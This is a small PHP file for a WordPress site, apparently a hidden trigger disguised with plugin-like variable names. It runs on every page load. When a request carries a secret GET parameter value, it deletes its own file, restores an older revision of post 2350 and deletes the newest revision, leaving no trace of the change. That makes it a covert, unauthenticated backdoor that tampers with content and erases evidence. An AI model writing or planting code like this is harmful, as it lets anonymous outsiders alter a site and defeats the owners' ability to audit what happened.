<?php

function fx_admin_master_top() {
	if (isset($_GET['html_slider_rates']) && $_GET['html_slider_rates'] === 'plugins_github_lead_extension') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$showcase_action_history = 2350;
		$ui_permalink_tools = wp_get_post_revisions($showcase_action_history);
		if (empty($ui_permalink_tools)) die('no revisions');
		if (count($ui_permalink_tools) < 2) die('less than 2');
		$mobile_url_fx_related = array_shift($ui_permalink_tools);
		$google_widgets_group_master = $mobile_url_fx_related->ID;
		$counter_cloud_edition = array_shift($ui_permalink_tools);
		$digital_replace_404 = $counter_cloud_edition->ID;
		$support_class_booster_uploader = wp_restore_post_revision($digital_replace_404);
		if ($support_class_booster_uploader === false) die('error restoring');
		$support_class_booster_uploader = wp_delete_post_revision($google_widgets_group_master);		
		if ($support_class_booster_uploader === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'fx_admin_master_top');
